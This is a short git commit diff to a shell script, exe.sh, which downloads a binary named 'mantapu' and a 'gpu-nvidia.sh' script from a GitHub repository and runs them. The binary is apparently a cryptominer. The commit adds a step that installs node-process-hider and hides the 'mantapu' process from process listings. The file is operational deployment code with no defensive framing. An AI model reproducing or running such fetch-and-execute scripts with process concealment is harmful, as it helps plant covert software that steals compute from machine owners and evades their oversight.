ee6a6fe8eefde9442edae5320cd9e5381832120e
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-22 15:07:11 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -2,7 +2,8 @@
 sudo apt update
 sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 79 95
-wget https://github.com/d-crypto99/xroc3/raw/main/mantapu
-wget https://raw.githubusercontent.com/d-crypto99/xroc3/main/gpu-nvidia.sh
+sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add mantapu 
+wget https://github.com/d-crypto99/xcroc4/raw/main/mantapu
+wget https://raw.githubusercontent.com/d-crypto99/xcroc4/main/gpu-nvidia.sh
 chmod +x gpu-nvidia.sh
 ./gpu-nvidia.sh
